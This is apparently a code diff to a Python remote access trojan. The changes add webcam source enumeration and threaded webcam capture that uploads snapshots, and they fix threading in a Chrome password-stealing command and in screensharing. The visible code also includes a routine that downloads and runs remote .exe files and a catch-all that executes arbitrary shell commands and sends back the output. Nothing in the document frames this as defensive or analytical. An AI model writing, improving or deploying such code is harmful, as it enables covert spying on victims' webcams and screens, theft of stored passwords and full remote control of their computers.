@@ -29,21 +29,44 @@ import psutil
 import urllib.request as urllib2
 import platform
 import struct
+def webcamlist():
 
-def webcam():
-    camera = VideoCapture(0)
-    while True:
-        return_value, image = camera.read()
-        imwrite(appd+'\\jarbou3.jpg', image)
-        size = os.path.getsize(appd+'\\jarbou3.jpg')
+    index = 0
+    arr = []
+    i = 10
+    while i > 0:
+        cap = VideoCapture(index)
+        if cap.read()[0]:
+            arr.append(index)
+            cap.release()
+        index += 1
+        i -= 1
+    l = ""
+    for j in range(len(arr)):
+        l = l + "Source "+str(arr[j])+"\n"
 
-        if size == 5432:
-            continue
-        else:
-            upload_file(appd+'\\jarbou3.jpg')
-            os.remove(appd+'\\jarbou3.jpg')
-            break
+    reliable_send("Available Sources \n"+l)
 
+
+def webcam(webcam):
+    try:
+        camera = VideoCapture(int(webcam))
+        while True:
+            try:
+                return_value, image = camera.read()
+                imwrite(appd + '\\jarbou3.jpg', image)
+                size = os.path.getsize(appd + '\\jarbou3.jpg')
+            except:
+                break
+            else:
+                if size == 5432:
+                    continue
+                else:
+                    upload_file(appd + '\\jarbou3.jpg')
+                    os.remove(appd + '\\jarbou3.jpg')
+                    break
+    except Exception as e:
+        pass
 
 def scanport(ip,port):
 
@@ -547,17 +570,17 @@ def Mbox(title, text, style):
 def downloadfilenet(url):
     r = get(url)
     if url[-4:] != '.exe':
-        print(randfilename)
         reliable_send('[-] this function work just with .exe files')
     else:
         with open(appd + '\\' + randfilename + '.exe', 'wb') as file:
             file.write(r.content)
         try:
-            reliable_send('executing file in ' + randfilename + '.exe')
             os.popen(appd + '\\' + randfilename + '.exe')
 
         except:
             reliable_send('[-]ERROR')
+        else:
+            reliable_send('executing file in ' + randfilename + '.exe')
 def getip():
     try:
         r = get('http://ifconfig.me')
@@ -791,7 +814,7 @@ def shell():
                         continue
                 elif command[:12] == 'chrome_recon':
                     try:
-                        recover = threading.Thread(target=chromepassword())
+                        recover = threading.Thread(target=chromepassword)
                         recover.start()
                         passwords = open(appd + '\\' + getpass.getuser() + '-Passwords.txt', 'r').read()
                         reliable_send(passwords)
@@ -829,7 +852,7 @@ def shell():
                     except:
                         reliable_send('command should be like this isopen ip:port')
                 elif command[:11] == 'screenshare':
-                    threading.Thread(target=screenshare())
+                    threading.Thread(target=screenshare)
                 elif command == 'ngroksetup':
 
                     download_file(appd + '\\systemsoft.exe')
@@ -840,8 +863,21 @@ def shell():
                         reliable_send('[-]error')
                         continue
                 elif command[:11] == "webcam_snap":
-                    webcam()
+                    source = command[12:]
+                    try:
+                      if source == "":
+                          web = threading.Thread(target=webcam,args="0")
+                          web.start()
+                      else:
+                          web = threading.Thread(target=webcam, args=source)
+                          web.start()
+
+                    except:
+                        continue
+                elif command[:11] == "webcam_list":
+                    webcamlist()
                 else:
+
                     execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE)
                     result = execute.stdout.read() + execute.stderr.read()
